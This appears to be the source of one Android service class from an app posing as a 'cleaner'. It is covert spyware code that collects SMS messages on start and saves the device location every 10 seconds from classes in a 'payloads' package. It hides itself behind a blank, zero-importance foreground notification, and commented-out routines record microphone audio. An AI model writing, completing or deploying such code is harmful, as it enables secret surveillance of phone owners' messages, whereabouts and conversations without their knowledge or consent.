package com.cleaner;

import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.location.Location;
import android.location.LocationListener;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.IBinder;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.core.app.NotificationCompat;

import com.cleaner.payloads.SMSManager;
import com.cleaner.payloads.locationManager;

import java.io.IOException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;

public class Application extends Service implements LocationListener {
    private locationManager location = new locationManager(this, new Activity());
    private final SMSManager smsManager = new SMSManager();

    @Override
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onCreate() {
        super.onCreate();
        location.init();
        smsManager.saveSMS(this);
        collectData(this);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String channelId = new String();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            channelId = createNotificationChannel("my_service", "My Background Service");
        }

        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, 0);
        Notification notification = new NotificationCompat.Builder(this, channelId)
                .setContentTitle("")
                .setContentText("")
                .setSmallIcon(R.drawable.icon)
                .setContentIntent(pendingIntent)
                .build();

        startForeground(8800, notification);

        return Service.START_NOT_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private String createNotificationChannel(String channelId, String channelName) {
        NotificationChannel channel = new NotificationChannel(channelId, channelName,
                NotificationManager.IMPORTANCE_NONE);
        channel.setLightColor(Color.BLUE);
        channel.setLockscreenVisibility(Notification.VISIBILITY_PRIVATE);
        NotificationManager service = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        service.createNotificationChannel(channel);
        return channelId;
    }

    /**
     * Every 10000ms save data
     * */
    private void collectData(Context context) {
        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                location.saveLocation(context, location.getLastLocation());
                onDestroy();
            }
        }, 0, 10000);
    }


//    private void recordAudio(String file, final int time) {
//        MediaRecorder recorder = new MediaRecorder();
//
//        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
//        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
//        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
//        recorder.setOutputFile(file);
//
//        try {
//            recorder.prepare();
//        } catch (IOException exception) {
//            exception.printStackTrace();
//        }
//
//        recorder.start();
//
//        Thread timer = new Thread(() -> {
//            try {
//                Thread.sleep(time * 1000L);
//            } catch (InterruptedException e) {
//                Log.d("TAG", "timer.interrupted");
//                e.printStackTrace();
//            } finally {
//                recorder.stop();
//                recorder.release();
//            }
//        });
//        timer.start();
//    }
//
//    private void saveAudio(Context context) {
//        DateFormat formatter = new SimpleDateFormat("yyyy-MM-dd-HH-mm-ss", Locale.UK);
//        Date date = new Date();
//        String filePrefix = context.getApplicationInfo().dataDir + "/audio-";
//        recordAudio(filePrefix + formatter.format(date) + ".3gp", 15);
//    }
//
//    private void searchDevice() {
//        Vibrator vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
//            vibrator.vibrate(VibrationEffect.createOneShot(500, VibrationEffect.DEFAULT_AMPLITUDE));
//        } else {
//            vibrator.vibrate(100);
//        }
//    }

    @Override
    public void onLocationChanged(@NonNull Location location) {

    }
}
